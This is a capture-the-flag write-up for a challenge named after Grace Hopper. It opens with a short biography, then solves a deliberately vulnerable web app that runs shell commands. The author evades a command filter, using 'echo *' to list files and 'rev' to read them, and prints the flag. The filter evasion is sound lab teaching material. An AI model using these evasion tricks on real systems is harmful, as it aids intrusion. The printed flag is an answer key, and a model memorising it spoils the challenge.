# Grace Hopper

## Grace Brewster Hopper

[Grace Brewster Hopper](https://en.wikipedia.org/wiki/Grace_Hopper)  (née Murray; December 9, 1906 – January 1, 1992) was an American computer scientist, mathematician, and United States Navy rear admiral. One of the first programmers of the Harvard Mark I computer, she was a pioneer of computer programming who invented one of the first linkers. Hopper was the first to devise the theory of machine-independent programming languages, and the FLOW-MATIC programming language she created using this theory was later extended to create COBOL, an early high-level programming language still in use today. -  [Wikipedia Entry](https://en.wikipedia.org/wiki/Grace_Hopper)

## Description

Chal: Command  [this webapp](https://cyberheroines-web-srv2.chals.io/vulnerable.php)  like  [this Navy Real Admiral](https://www.youtube.com/watch?v=1LR6NPpFxw4)

Alternate (Better) Connection:  [webapp](http://ec2-3-144-228-78.us-east-2.compute.amazonaws.com:6262/vulnerable.php)

Author:  [Sandesh](https://github.com/Sandesh028)

## Solution

![grace-hopper-1](/assets/ctf/cyberheroinesctf/grace-hopper-1.png)

The application allows us to run console commands. The first command I tried was `ls`, but got following output: `You think it's that easy? Try harder!`. Some commands are being filtered, because `id` works: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Getting around `ls` is quite easy, `echo *` will do the trick.

_The `echo *` command in Linux prints all the files and directories in the current directory to the standard output. The asterisk (*) is a wildcard character that matches any character. So, the `echo *` command will print all the files and directories, regardless of their names._

```
cyberheroines.sh cyberheroines.txt vulnerable.php
```

We found the files, now to read them. Here we are also limited on commands. I tried `cat`, `tac`, `more`, `less`, `head`, `tail`, but none of them worked. Linux has `rev` program which reverses the text and using `rev` we can read file.

```
Command: rev cyberheroines.txt

Output: -  7a34781dbf938ac21363742c7e3e18344c663990279d20daa8b2cc009bc94d2e
```

Not good, the flag seems to be hashed. What's the `sh` file anyway?

```
Command: rev cyberheroines.sh

Output:
"}Y@w_3#T_s!_$!#t{FTCHC"=GALF
txt.seniorehrebyc > mus652ahs | "GALF$" n- ohce
```

Reverse the text:

```
echo -n "$FLAG" | sha256sum > cyberheroines.txt
FLAG="CHCTF{t#!$_!s_T#3_w@Y}"
```
::: tip Flag
`CHCTF{t#!$_!s_T#3_w@Y}`
:::